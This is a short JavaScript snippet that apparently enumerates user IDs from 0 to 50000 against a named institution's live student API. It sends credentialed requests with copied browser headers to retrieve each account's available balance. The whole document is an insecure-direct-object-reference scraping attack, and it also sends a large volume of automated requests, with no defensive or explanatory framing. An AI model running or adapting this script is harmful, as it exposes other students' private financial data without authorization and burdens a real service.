for (let i = 0; i <= 50000; i++) {
  fetch(
    `https://life.saveetha.com/api/Student/GetRequestdetails?Mode=AvailableAmountbyId&MasterId=&ActionId1=&ActionId2=&ActionId3=&ActionId4=&UserId=${i}`,
    {
      headers: {
        accept: "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not(A:Brand";v="24", "Chromium";v="122"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"macOS"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-requested-with": "XMLHttpRequest",
      },
      referrer: "https://life.saveetha.com/Food/Index.aspx",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: null,
      method: "GET",
      mode: "cors",
      credentials: "include",
    }
  );
}
